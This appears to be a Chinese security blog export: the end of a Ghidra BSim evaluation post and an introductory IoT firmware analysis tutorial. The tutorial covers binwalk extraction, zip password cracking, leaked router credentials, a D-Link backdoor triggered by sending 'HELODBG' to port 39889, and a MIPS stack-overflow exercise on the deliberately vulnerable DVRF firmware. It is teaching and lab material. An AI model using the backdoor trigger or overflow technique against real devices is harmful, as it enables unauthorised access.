<li><span class="exturl" data-url="aHR0cDovL0R1bXBCU2ltRGVidWdTaWduYXR1cmVzU2NyaXB0LnB5">DumpBSimDebugSignaturesScript.py<i class="fa fa-external-link-alt"></i></span>：导出选定函数的函数和调试信息<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240103195635.png" alt="20240103195635"></li>
<li><span class="exturl" data-url="aHR0cDovL0R1bXBCU2ltU2lnbmF0dXJlc1NjcmlwdC5weQ==">DumpBSimSignaturesScript.py<i class="fa fa-external-link-alt"></i></span>：导出选定函数的函数签名哈希（与java脚本导出的哈希值不同）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240103200008.png" alt="20240103200008"></li>
<li><span class="exturl" data-url="aHR0cDovL0V4YW1wbGVPdmVydmlld1F1ZXJ5U2NyaXB0LnB5">ExampleOverviewQueryScript.py<i class="fa fa-external-link-alt"></i></span>：GUI的Overview功能</li>
<li><span class="exturl" data-url="aHR0cDovL0dlbmVyYXRlU2lnbmF0dXJlcy5weQ==">GenerateSignatures.py<i class="fa fa-external-link-alt"></i></span>：生成签名</li>
<li><span class="exturl" data-url="aHR0cDovL1F1ZXJ5RnVuY3Rpb24ucHk=">QueryFunction.py<i class="fa fa-external-link-alt"></i></span>：GUI里的search功能</li>
</ul>
<h1>匹配的例子</h1>
<p>由于BSim会得到多个匹配结果，并且相似度值可能都相同，函数A的结果也可能和函数B匹配到的存在重复，因此比较fn，fp等对其他工具较为不公平。</p>
<h2 id="单个函数的匹配">单个函数的匹配</h2>
<p><em>青绿色的是函数的差异</em><br>
当用光标进行选择时，<em>粉色是bsim关注的并且产生匹配的token</em>；<em>淡紫色是bsim关注但是没有匹配到的token</em>；<em>橘色表示token不会用作匹配</em></p>
<p>以下两对的相似值分别为1和0.777<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240104165115.png" alt="20240104165115"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240104165141.png" alt="20240104165141"></p>
<h2 id="二进制文件相似度">二进制文件相似度</h2>
<p>排除了较低hitcont和较小的函数<br>
library score：当较小的二进制在另一个二进制里全都能找到匹配则为1</p>
<p>用提供的脚本跑的跨架构的例子，得到的文件相似度很低</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240104112320.png" alt="20240104112320"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240104163037.png" alt="20240104163037"></p>
<h2 id="recall">recall</h2>
<p>由于一个待匹配函数会得到多个匹配的结果，因此把这些结果都视为匹配</p>
<ol>
<li>7zip-rar<br>
（GT里119个函数匹配到126个）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240104155104.png" alt="20240104155104"></li>
<li>apache2-bin<br>
（GT里1198个函数匹配到829个）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240104164252.png" alt="20240104164252"></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>IoT固件分析入门</title>
    <url>/3607.html</url>
    <content><![CDATA[<blockquote>
<p>本文由<strong>本人</strong>首发于安全客：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjQ1OTQ1">IoT固件分析入门 - 安全客，安全资讯平台 (anquanke.com)<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>不知道干啥，打算把前段时间GitHub 上 star 了的一个项目学一遍，地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0c0cmIzbi9Jb1RfU2VjX1R1dG9yaWFsLw==">IoT_Sec_Tutorial<i class="fa fa-external-link-alt"></i></span></p>
<p>访问慢的话，gitee上也有镜像可看<br>
目测纯固件，贼基础<br>
update：像是对《路由器0day》那本书部分内容的整理和补充</p>
<span id="more"></span>
<h1>0x0准备</h1>
<p>因为kali是刚上大学的时候装的，现在都出到2021了，我的版本还是2019，所以先升级一波</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;deb http://http.kali.org/kali kali-rolling main non-free contrib&quot; | sudo tee /etc/apt/sources.list</span><br><span class="line">sudo apt update &amp;&amp; sudo apt -y full-upgrade</span><br><span class="line">[ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f</span><br></pre></td></tr></table></figure>
<ul>
<li>更新完后可以查看一下系统版本：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep VERSION /etc/os-release</span><br></pre></td></tr></table></figure>
<ul>
<li>更新系统时间（我的时间好像之前一直都不对orz）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install -y ntpdate</span><br><span class="line">rm -rf etc/localtime</span><br><span class="line">cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">ntpdate -u ntp.api.bz</span><br></pre></td></tr></table></figure>
<ul>
<li>切换shell（为啥升级后zsh没有直接变成默认orzz）<br>
先查看系统中有几种shell：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure>
<p>kali自带了zsh，直接切换就行了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp -i /etc/skel/.zshrc ~/</span><br><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
<p>zsh配合oh-my-zsh比较好用，安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</span><br></pre></td></tr></table></figure>
<p>添加全路径显示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gedit ~/.oh-my-zsh/themes/robbyrussell.zsh-theme</span><br><span class="line"><span class="meta">#</span><span class="bash">然后把%&#123;<span class="variable">$fg</span>[cyan]%&#125;%c%&#123;<span class="variable">$reset_color</span>%&#125;的%c改为[<span class="variable">$PWD</span>]</span></span><br></pre></td></tr></table></figure>
<p>如果想用别的桌面系统：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --config x-session-manager</span><br></pre></td></tr></table></figure>
<h1>0x1提取固件</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">之前用过binwalk，但大多都是在misc题目里处理压缩文件、图片啥的，没有仔细看过binwalk的命令</span><br><span class="line">其实除了binwalk之外，还有其他的固件分析/提取工具，在GitHub上用“firmware analysis”之类的关键词能查到</span><br></pre></td></tr></table></figure>
<p>给了个华硕RT-N300路由器的固件，binwalk直接提取即可。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620224600.png" alt="20210620224600"><br>
提取出来发现没有进行加密（…16年，这也太不安全了吧orz，不过现在基本都有了</p>
<p>可以看到这个路由器用的是squashfs文件系统</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620225019.png" alt="20210620225019">其中squashfs-root可用于分析了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件系统是操作系统的重要组成部分，是操作运行的基础。不同的路由器使用的文件系统格式不尽相同。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。路由器希望文件系统越小越好，所以这些文件系统中各种压缩格式随处可见。</span><br><span class="line"></span><br><span class="line">Squashfs是一个只读格式的文件系统，具有超高压缩率，其压缩率最高可达34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。</span><br><span class="line"></span><br><span class="line">Squashfs文件系统常用的压缩格式有GZIP、LZMA、LZO、XZ（LZMA2）。路由器的根文件系统通常会按照Squashfs文件系统常用压缩格式中的一种进行打包，形成一个完整的Squashfs文件系统，然后与路由器操作系统的内核一起形成更新固件。</span><br><span class="line"></span><br><span class="line">由于squashFS可以在不需要解压的情况下直接挂载，因此有许多应用场景，例如：</span><br><span class="line">1、安装Linux时用的live cd</span><br><span class="line">2、小型嵌入式设备中的rootfs。rootfs一般以压缩好的形式存放在ROM中，如果开机时把整个rootfs都解压到内存里再读取，对于ROM和RAM容量一般都很小的小型嵌入式设备来说性价比太低。</span><br></pre></td></tr></table></figure>
<h2 id="Binwalk命令选项">Binwalk命令选项</h2>
<p>常规选项：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620224159.png" alt="20210620224159"></p>
<p>提取选项：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620224110.png" alt="20210620224110"></p>
<p>Diff：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620224324.png" alt="20210620224324"></p>
<p>文件签名：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624986195558.png" alt="1624986195558"></p>
<p>熵值：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624986159726.png" alt="1624986159726"></p>
<p>Raw Compression：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624986173336.png" alt="1624986173336"></p>
<h2 id="如何手动提取固件">如何手动提取固件</h2>
<p>squashfs文件系统头部特征较多，有sqsh、hsqs、qshs、shsq、hsqt、tqsh、sqlz。我们用hexdump搜索特征在文件中的地址</p>
<ul>
<li>hexdump：一个二进制文件的查看工具，可转为OCT、DEC、HEX进制查看<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210621132510.png" alt="20210621132510"></li>
</ul>
<p>得到如下搜索结果<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210621133748.png" alt="20210621133748"></p>
<p>hsqs位于文件的0xe20c0，用dd命令截取出固件：</p>
<ul>
<li>注：dd命令中skip指定的值只能为十进制。用shell转换进制可以使用：$((BASE#NUM))</li>
<li><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624255953284.png" alt="1624255953284"></li>
</ul>
<p>得到了一个squashfs格式的文件<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210621134851.png" alt="20210621134851"><br>
用unsquashfs解压得到squashfs-root，即用binwalk提取出的同名文件。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624255856853.png" alt="1624255856853"></p>
<p>如果遇到binwalk之类的工具无法提取的情况，大多都是经过混淆，需要进一步处理</p>
<h2 id="Binwalk如何进行提取：">Binwalk如何进行提取：</h2>
<p>通过maigc特征集与文件进行比对，但识别效率比file命令高多了<br>
特征集：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1JlRmlybUxhYnMvYmlud2Fsay90cmVlLzYyZTljYWExNjQvc3JjL2JpbndhbGsvbWFnaWM=">https://github.com/ReFirmLabs/binwalk/tree/62e9caa164/src/binwalk/magic<i class="fa fa-external-link-alt"></i></span></p>
<p>识别过程主要使用libmagic库的4个函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">magic_t</span> <span class="title">magic_open</span><span class="params">(<span class="keyword">int</span> flags)</span></span>;<span class="comment">//创建并返回一个magic cookie指针。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic_close</span><span class="params">(<span class="keyword">magic_t</span> cookie)</span></span>;<span class="comment">//关闭magic签名数据库并释放所有使用过的资源。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">magic_buffer</span><span class="params">(<span class="keyword">magic_t</span> cookie,<span class="keyword">const</span> <span class="keyword">void</span> *buffer,<span class="keyword">size_t</span> len)</span></span>;<span class="comment">//读取buffer中指定长度的数据并与magic签名数据库进行对比，返回对比结果描述。</span></span><br><span class="line"></span><br><span class="line"><span class="function">Int <span class="title">magic_load</span><span class="params">(<span class="keyword">magic_t</span> cookie,<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span>;<span class="comment">//从filename指定文件加载magic签名数据库，Binwalk把多个magic签名文件组合到一个临时文件中用于加载</span></span><br></pre></td></tr></table></figure>
<h1>0x2 静态分析</h1>
<p>给了个从Dlink固件里提取的样本，打开发现被加密了，得爆破。</p>
<p>kali自带了一些关于压缩文件的工具，比如生成字典用的crunch、rsmangler，爆破用的frackzip等，这些工具用法都不难</p>
<ul>
<li>crunch:<span class="exturl" data-url="aHR0cHM6Ly9ieXN0YXJ0LmNuL2luZGV4LnBocC8xNy9saW51eC8wNw==">Kali使用crunch生成密码字典 - 青檬小栈 <i class="fa fa-external-link-alt"></i></span><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624260673155.png" alt="1624260673155"></li>
</ul>
<p>直接用frackzip破解，（根据教程的提示）得到密码beUT9Z</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624261882922.png" alt="1624261882922"></p>
<p>解压得到以下文件</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624262791018.png" alt="1624262791018"></p>
<ul>
<li>.mbn：高通的一套用于加载网络环境的文件（modem software configuration）</li>
<li>.yaffs2：针对NAND芯片设计的嵌入式文件系统，可用unyaffs提取</li>
</ul>
<p>unyaffs提取yaffs2</p>
<p>核心应该是2K-mdm-image-mdm9625.yaffs2，不确定的话可以把三个.yaffs2都提取了（然后就该复习一下嵌入式系统的目录结构了）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624264395101.png" alt="1624264395101"></p>
<p>接下来查看配置文件，有可能从配置文件中发现敏感信息</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624264784960.png" alt="1624264784960"></p>
<blockquote>
<p>其中的inadyn-mt.conf文件引起了我们注意，这是no-ip应用的配置文件，no-ip就是一个相当于花生壳的东西，可以申请动态域名</p>
</blockquote>
<p>cat 一看，果然no-ip的用户名和密码都出现了（这么明显真的难以置信）</p>
<p>接下来使用firmwalker来自动化遍历</p>
<blockquote>
<p>Firmwalker:</p>
<p>A simple bash script for searching the extracted or mounted firmware file system.</p>
<p>It will search through the extracted or mounted firmware file system for things of interest such as:</p>
<ul>
<li>etc/shadow and etc/passwd</li>
<li>list out the etc/ssl directory</li>
<li>search for SSL related files such as .pem, .crt, etc.</li>
<li>search for configuration files</li>
<li>look for script files</li>
<li>search for other .bin files</li>
<li>look for keywords such as admin, password, remote, etc.</li>
<li>search for common web servers used on IoT devices</li>
<li>search for common binaries such as ssh, tftp, dropbear, etc.</li>
<li>search for URLs, email addresses and IP addresses</li>
<li>Experimental support for making calls to the Shodan API using the Shodan CLI</li>
</ul>
<p>（其实就相当于一个遍历查找后缀、内容的批处理脚本）</p>
</blockquote>
<p>使用脚本获得所有可能可以利用的文件（建议进入脚本目录执行）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624270973127.png" alt="1624270973127"></p>
<p>除了配置文件外，分析存在风险的二进制程序也很重要。</p>
<p>在etc/init.d目录下存放启动时运行的程序和脚本，其中有一个叫start_appmgr，mgr一般指固件的主控。查看脚本：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624273313162.png" alt="1624273313162"></p>
<p>把appmgr拖到ida<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624273441470.png" alt="1624273441470"></p>
<p>凭借一点点pwn的经验，我们发现了一个backdoor<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624273657173.png" alt="1624273657173"></p>
<p>这个漏洞被收录到CVE-2016-10178：<span class="exturl" data-url="aHR0cHM6Ly9waWVycmVraW0uZ2l0aHViLmlvL2Jsb2cvMjAxNi0wOS0yOC1kbGluay1kd3ItOTMyYi1sdGUtcm91dGVycy12dWxuZXJhYmlsaXRpZXMuaHRtbA==">Multiple vulnerabilities found in the Dlink DWR-932B (backdoor, backdoor accounts, weak WPS, RCE …) - IT Security Research by Pierre (pierrekim.github.io)<i class="fa fa-external-link-alt"></i></span></p>
<p>即向192.168.1.1:39889发送HELODBG可以直接getshell（不太清楚为啥是39889端口，静态看了好久没看出来，<s>猜测是跟下图和label_66有关</s>）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624281330648.png" alt="1624281330648"></p>
<p>update:用Ghidra搜到了<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624282660256.png" alt="1624282660256"></p>
<p>这个漏洞确实明显2333</p>
<p>这个固件还有好几个漏洞，太拉了吧Orz…</p>
<h1>0x3 动态分析</h1>
<h2 id="QEMU和Firmadyne">QEMU和Firmadyne</h2>
<p>QEMU这个模拟器想必都不陌生，一个近乎能够模拟所有硬件设备的软件；倒是第一次听说Firmadyne这个工具，查了一下是一个基于QEMU的分析平台，包含模拟、固件提取、调试等功能，但似乎支持的硬件设备较少？orz</p>
<h2 id="部署Firmadyne">部署Firmadyne</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tutorial里用的是attifyti提供的Ubuntu 14（因为作者说部署这玩意太麻烦了），但Firmadyne的作者在项目的某个issue里说了句“Ubuntu 14 也太早了”之类的话，于是打算自己部署一下</span><br><span class="line">Also，如果想用直接用attifyti的AttifyOS，https://github.com/adi0x90/attifyos，目前的系统基于Ubuntu18.04，官方的下载地址在谷歌网盘</span><br></pre></td></tr></table></figure>
<h3 id="准备">准备</h3>
<p>因为涉及到GitHub上一些项目的下载，网络不太好的话可能需要一些帮助：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clash on kali:</span><br><span class="line">下载clash并运行：https://github.com/Dreamacro/clash/releases</span><br><span class="line">导入节点：wget -O ~/.config/clash/config.yaml  clash_url</span><br><span class="line"></span><br><span class="line">配置代理：</span><br><span class="line">gsettings set org.gnome.system.proxy mode &#x27;manual&#x27;</span><br><span class="line">gsettings set org.gnome.system.proxy.http port 7890</span><br><span class="line">gsettings set org.gnome.system.proxy.http host &#x27;127.0.0.1&#x27;</span><br><span class="line">gsettings set org.gnome.system.proxy.socks port 7891</span><br><span class="line">gsettings set org.gnome.system.proxy.socks host &#x27;127.0.0.1&#x27;</span><br><span class="line">gsettings set org.gnome.system.proxy ignore-hosts &quot;[&#x27;localhost&#x27;, &#x27;127.0.0.0/8&#x27;, &#x27;::1&#x27;]&quot;\</span><br><span class="line"></span><br><span class="line">进行配置，访问：</span><br><span class="line">http://clash.razord.top/</span><br></pre></td></tr></table></figure>
<p>** 注：以下绕了好多弯，最后也没成功，用了AttifyOS 😅😅😅😅😅</p>
<h3 id="【方案1】安装Firmadyne">【方案1】安装Firmadyne</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils</span><br><span class="line">apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan</span><br><span class="line">git clone --recursive https://github.com/firmadyne/firmadyne.git</span><br><span class="line">cd ./firmadyne</span><br><span class="line">./download.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>配置Postgresql：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装数据库</span><br><span class="line">sudo apt-get install postgresql</span><br><span class="line"># 创建用户,注意要设置密码为 firmadyne</span><br><span class="line">sudo -u postgres createuser -P firmadyne</span><br><span class="line"># 创建数据库</span><br><span class="line">sudo -u postgres createdb -O firmadyne firmware</span><br><span class="line"># 初始化数据库</span><br><span class="line">sudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema</span><br></pre></td></tr></table></figure>
<p>如果出现如下错误</p>
<blockquote>
<p>could not connect to database template1: could not connect to server: No such file or directory.</p>
<p>Is the server running locally and accepting</p>
<p>connections on Unix domain socket “var/run/postgresql/.s.PGSQL.5432”?</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624444045680.png" alt="1624444045680"></p>
<p>有可能是没有初始化数据库（至少我是因为这个），用如下方法解决：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 设置postgres用户的密码</span></span><br><span class="line">passwd postgres</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建postgresql的文件夹</span></span><br><span class="line">sudo mkdir /data</span><br><span class="line">sudo chmod o+w /data</span><br><span class="line">su - postgres</span><br><span class="line">mkdir /data/postgresql</span><br><span class="line">mkdir /data/postgresql/data</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> postgres用户初始化数据库</span></span><br><span class="line">/usr/lib/postgresql/13/bin/initdb -D /data/postgresql/data</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动数据库</span></span><br><span class="line">/usr/lib/postgresql/13/bin/pg_ctl -D /data/postgresql/data -l logfile start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查看是否监听了端口(结果应类似下图)</span></span><br><span class="line">netstat -nlp |grep 5432</span><br><span class="line"></span><br><span class="line">参考：https://www.cnblogs.com/0x200/p/14026460.html</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624443670290.png" alt="1624443670290"></p>
<p>接下来应该就能按照官方的Usage来使用了（没试）：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zpcm1hZHluZS9maXJtYWR5bmUjdXNhZ2U=">firmadyne: Platform for emulation and dynamic analysis of Linux-based firmware <i class="fa fa-external-link-alt"></i></span></p>
<h3 id="【方案2】安装firmware-analysis-plus">【方案2】安装<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpeWFuc29uZzIwMTgvZmlybXdhcmUtYW5hbHlzaXMtcGx1cw==">firmware-analysis-plus<i class="fa fa-external-link-alt"></i></span></h3>
<p>因为用Firmadyne直接进行调试比较麻烦，所以用了FAP这个项目。</p>
<p>这是个国人写的中文项目，没啥好说的：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpeWFuc29uZzIwMTgvZmlybXdhcmUtYW5hbHlzaXMtcGx1cw==">liyansong2018/firmware-analysis-plus: 开源固件仿真平台，使用 firmadyne 一键模拟固件 (github.com)<i class="fa fa-external-link-alt"></i></span></p>
<p>安装作者提供的binwalk的时候一直报错(kali2021 &amp; ubuntu18 both)，导致一直卡在提取固件的步骤（emmmm哪位大哥部署成功后教我一下)</p>
<p><img src="https://user-images.githubusercontent.com/29673689/123412395-21b98c00-d5e4-11eb-9f18-48bfe66710b9.png" alt="image"></p>
<p>对此提了个issue</p>
<h3 id="【方案3】AttifyOS">【方案3】AttifyOS</h3>
<p>这个方法比较稳，自己部署也太折磨人了（外加考试周给娃弄傻了）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624627289020.png" alt="1624627289020"></p>
<p><em>注：密码是attify</em></p>
<h2 id="模拟执行固件">模拟执行固件</h2>
<p>模拟固件运行：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624627931880.png" alt="1624627931880">通过192.168.0.50即可访问固件</p>
<h2 id="调试固件">调试固件</h2>
<p>这个部分用到了Damn Vulnerable Router Firmware这个项目，大小400M+，建议上gitee clone</p>
<p>安装以下工具：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br><span class="line">wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br><span class="line">sudo pip3 install capstone unicorn keystone-engine</span><br></pre></td></tr></table></figure>
<p>进入DVRF/Firmware/，用binwalk提取DVRF_v03.bin</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624632998578.png" alt="1624632998578"></p>
<p>提取出来的目录里有个文件夹pwnable，里面存放着漏洞程序示例，选取stack_bof_01程序进行实验，程序的源代码可以在DVRF/Pwnable Source/Intro/里查看</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624633241653.png" alt="1624633241653"></p>
<p>首先用reasdelf查看程序架构</p>
<p>!<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624633746613.png" alt="1624633746613"></p>
<p>（顺手试了一下checksec，这里居然有装😀）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624633809906.png" alt="1624633809906"></p>
<p>拷贝qwmu-mipsel-static到固件根目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp (which qemu-mipsel-static) .</span><br></pre></td></tr></table></figure>
<p>用qemu虚拟运行stack_bof_01：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624694537916.png" alt="1624694537916"></p>
<p>以调试的方式启动程序，并在1234端口进行监听：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01</span><br></pre></td></tr></table></figure>
<p>打开一个新的shell，运行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-multiarch pwnable/Intro/stack_bof_01</span><br><span class="line"></span><br><span class="line"># 设置架构</span><br><span class="line">set architecture mips</span><br><span class="line"></span><br><span class="line">#设置调试端口</span><br><span class="line">target remote 127.0.0.1:1234</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624704034068.png" alt="1624704034068"></p>
<p>创建trash触发溢出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern create 300</span><br></pre></td></tr></table></figure>
<p>带上它重新进行调试</p>
<p>gdb attach后继续让程序运行，触发vul</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624704529132.png" alt="1624704529132"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624714926982.png" alt="1624714926982"></p>
<p>接下来就直接ret2system，但经过尝试后发现，如果直接把跳转地址设置为后门函数dat_shell的起始地址0x400950会触发异常</p>
<p>查看函数汇编代码（MIPS…看不懂的话可以边看边学一波，<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZseWluZ3FyL2FydGljbGUvZGV0YWlscy83MDczMDg4">MIPS 通用寄存器_flyingqr的专栏-CSDN博客_mips寄存器<i class="fa fa-external-link-alt"></i></span>；<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ2xvZGVhcnMvcC85NzYyNjE1Lmh0bWw=">MIPS汇编指令集 - 深海之炎 - 博客园 <i class="fa fa-external-link-alt"></i></span>；<span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2xpeWFuZnUvbXE2NXBiL2J2N3hiNQ==">MIPS的汇编指令 · 语雀 <i class="fa fa-external-link-alt"></i></span>）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624718994151.png" alt="1624718994151"></p>
<p>调试中发现，当执行到0x400970时，gp寄存器指向了不可访问的地址</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624724526947.png" alt="1624724526947"></p>
<p>而gp的值是由上一条指令得到的</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624724654160.png" alt="1624724654160"></p>
<p>本来执行后v0要指向 指向__DT_MIPS_BASE_ADDRESS的指针</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624727049941.png" alt="1624727049941"></p>
<p>简单来说就是强行跳转到backdoor之后，因为t9（默认在运行中指向当前函数的起始地址）没有发生改变，导致在执行0x400970时产生异常访问</p>
<p>但可以发现（其实是按照exp来推…）main函数中的gp在-0x7fe4后刚好指向PTR__DT_MIPS_BASE_ADDRESS*（猜测原因是源代码中后门函数在main函数后面且没有被调用，导致编译时认为main函数和后门函数的 gp和表的偏移 相等）</p>
<p>于是得到<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624730236282.png" alt="1624730236282"></p>
<hr>
<p>update：</p>
<p>main函数中<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624731700885.png" alt="1624731700885"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624731779105.png" alt="1624731779105"></p>
<p>所以gp在函数执行完毕后依旧指向的是基地址表</p>
<hr>
<p><em>感觉对于mips程序的分析，Ghidra比IDA好用些</em></p>
<p>从这题也能看出mips和x86、x64的不同之处，<strong>除了这种特殊情况外，大多数情况下还是应该寻找gadget来进行跳转改变t9寄存器</strong></p>
<p><strong>这一节就到这，DVRF这个项目还设计了一些别的漏洞程序可以再进行分析</strong></p>
<h1>0x4 解密固件</h1>
<p>访问dlink的ftp服务器获得几个DIR-882的固件（图中选中的文件），时间跨度为2017~2020年</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624626949169.png" alt="1624626949169"></p>
<p>解压得到固件和对应的版本说明</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624772939989.png" alt="1624772939989"></p>
<h2 id="加密固件发布方案">加密固件发布方案</h2>
<p>一般来说，有三种发布固件的方案</p>
<ul>
<li>出厂时未加密，解密例程在高版本固件v1.1中给出，为后续的加密固件做准备<br>
对于这个方案，我们可以通过解密v1.1来获得解密例程</li>
<li>出厂时的固件已经加密，供应商决定更改高版本固件的加密方式，并发布了包含解密例程的未加密中间版本v1.2<br>
这一方案与上面那个类似</li>
